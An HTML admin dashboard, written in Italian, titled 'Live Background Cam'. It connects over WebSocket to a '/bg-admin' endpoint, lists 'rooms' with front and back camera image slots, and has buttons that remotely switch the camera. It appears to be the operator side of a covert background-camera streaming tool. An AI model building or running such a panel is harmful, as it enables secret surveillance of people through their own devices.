<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Live Background Cam</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<style>
  body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:15px; }
  .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; position:relative; }
  .cam img { width:100%; height:auto; display:block; object-fit:contain; }
  h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
  .status { color:#0f0; font-size:12px; text-align:center; padding:4px; position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.7); }
  .controls { margin-top:5px; text-align:center; }
  .controls button { background:#0f0; color:#000; border:none; padding:5px 10px; cursor:pointer; border-radius:4px; font-size:12px; }
</style>
</head>
<body>
<h1>Camera in Background</h1>
<div id="grid" class="grid"></div>

<script>
const grid = document.getElementById('grid');
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-admin`);
const rooms = new Map();
const imageCache = new Map();

ws.onopen = () => console.log('âœ… Admin connesso');
ws.onerror = err => console.error('WebSocket error:', err);
ws.onclose = () => console.warn('WebSocket chiuso');

ws.onmessage = e => {
  if (e.data instanceof Blob) return; // frame binario gestito altrove

  const data = JSON.parse(e.data);
  if (data.type === 'welcome') return;

  const roomKey = data.room;
  if (!rooms.has(roomKey)) {
    const div = document.createElement('div');
    div.className = 'cam';

    const title = document.createElement('h2');
    title.textContent = roomKey;

    const backImg = document.createElement('img');
    backImg.id = `img-${roomKey}-back`;
    const frontImg = document.createElement('img');
    frontImg.id = `img-${roomKey}-front`;

    const status = document.createElement('div');
    status.className = 'status';
    status.id = `status-${roomKey}`;
    status.textContent = 'Connesso';

    const controls = document.createElement('div');
    controls.className = 'controls';
    const btnFront = document.createElement('button');
    btnFront.textContent = 'Front';
    btnFront.onclick = () => ws.send(JSON.stringify({ type:'switchCamera', camera:'user' }));
    const btnBack = document.createElement('button');
    btnBack.textContent = 'Back';
    btnBack.onclick = () => ws.send(JSON.stringify({ type:'switchCamera', camera:'environment' }));
    controls.appendChild(btnFront);
    controls.appendChild(btnBack);

    div.appendChild(title);
    div.appendChild(backImg);
    div.appendChild(frontImg);
    div.appendChild(status);
    div.appendChild(controls);

    grid.appendChild(div);
    rooms.set(roomKey, { div, backImg, frontImg, status, controls });
  }
};
</script>
</body>
</html>
